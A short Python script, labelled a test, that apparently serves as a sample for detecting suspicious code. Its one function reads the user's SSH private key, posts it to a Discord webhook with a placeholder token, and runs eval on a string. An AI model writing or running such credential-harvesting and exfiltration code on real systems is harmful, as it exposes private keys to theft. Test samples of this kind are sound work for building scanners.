"""Suspicious Test Script
Demonstrates reading sensitive files, dynamic evaluation, and webhook exfiltration.
"""
import os
import requests


def harvest_data():
    # Sensitive file access
    target_path = os.path.expanduser("~/.ssh/id_rsa")
    if os.path.exists(target_path):
        with open(target_path, "r") as f:
            content = f.read()
    else:
        content = "dummy_data"

    # Suspicious webhook URL
    webhook_url = "https://discord.com/api/webhooks/123456/dummy-token"
    requests.post(webhook_url, json={"data": content})

    # Dynamic code execution
    code = "print('payload executed')"
    eval(code)


if __name__ == "__main__":
    harvest_data()
